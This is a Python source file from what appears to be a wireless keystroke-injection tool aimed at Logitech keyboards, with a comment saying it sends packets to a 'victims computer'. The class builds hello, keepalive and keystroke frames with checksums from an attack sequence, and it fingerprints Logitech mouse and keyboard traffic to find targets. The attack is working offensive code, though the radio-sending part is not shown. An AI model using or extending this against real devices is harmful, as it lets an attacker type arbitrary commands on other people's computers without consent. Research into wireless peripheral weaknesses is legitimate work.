#HID class for sending packets to victims computer

class HID(object):

    def __init__(self, address, payload): 
        self.address = address # the address to sent
        self.device_vendor = 'Logitech' # the type of the keyboard
        self.payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0] # tamplate for the payload sent
        self.keepalive = [0x00, 0x40, 0x04, 0xB0, 0x0C] # keep alive packet
        self.hello = [0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED] #hello packet
    
    # Check-sum: check the cksum in the packet
    def checksum(self, payload):
        cksum = 0xff
        for n in range(0, len(payload) - 1):
            cksum = (cksum - payload[n]) & 0xff
        cksum = (cksum + 1) & 0xff
        payload[-1] = cksum
        return payload

    def key(self, payload, key):
        payload[2] = key['mod'] # Enter the key to the payload packet
        payload[3] = key['hid'] # The payload for the packet
        return payload

    def frame(self, key={'hid': 0, 'mod': 0}): # creating the frames for the packet, calculating the key and the checksum for the packet
        return self.checksum(self.key(self.payload_template[:], key))
    
    #build the drame to send it
    def build_frames(self, attack):
        for i in range(0, len(attack)):
            key = attack[i]

            if i == 0:
                key['frames'] = [[self.hello[:], 12]]
            else:
                key['frames'] = []

            if i < len(attack) - 1:
                next_key = attack[i + 1]
            else:
                next_key = None

            if key['hid'] or key['mod']:
                key['frames'].append([self.frame(key), 12])
                key['frames'].append([self.keepalive[:], 0])
                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
                    key['frames'].append([self.frame(), 0])
            elif key['sleep']:
                count = int(key['sleep']) / 10
                for i in range(0, int(count)):
                    key['frames'].append([self.keepalive[:], 10])

    @classmethod
    def fingerprint(cls, p):
        if len(p) == 10 and p[0] == 0 and p[1] == 0xC2:
            # Definitely a logitech mouse movement packet
            return cls
        elif len(p) == 22 and p[0] == 0 and p[1] == 0xD3: # Sign for keystroke of the keyboard
            # Definitely a logitech keystroke packet
            return cls
        elif len(p) == 5 and p[0] == 0 and p[1] == 0x40:
            # Most likely logitech keepalive packet
            return cls
        elif len(p) == 10 and p[0] == 0 and p[1] == 0x4F:
            # Most likely logitech sleep timer packet
            return cls
        return None

    @classmethod
    def description(cls):
        return 'Logitech HID'
